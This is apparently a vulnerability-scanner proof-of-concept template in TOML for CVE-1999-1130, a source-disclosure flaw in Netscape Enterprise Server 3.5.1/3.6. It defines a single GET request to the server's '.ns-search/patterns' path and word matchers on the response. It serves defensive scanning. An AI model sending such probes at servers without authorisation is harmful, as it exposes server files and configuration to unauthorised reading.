[info]
author = "ave"
description = "验证Netscape Enterprise Server 3.5.1/3.6 JHTML文件源码泄露漏洞，通过搜索cgi的patterns参数读取jhtml文件源码"
id = "POC-AVE-1999-0972"
name = "Netscape Enterprise Server JHTML View Source PoC"
severity = "medium"
tags = ["ave-1999-0972"]
vuln_id = [
    "CVE-1999-1130",
    "AVE-1999-0972",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.ns-search/patterns/html-tocrec-demo1.pat"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "pattern",
    "config",
]
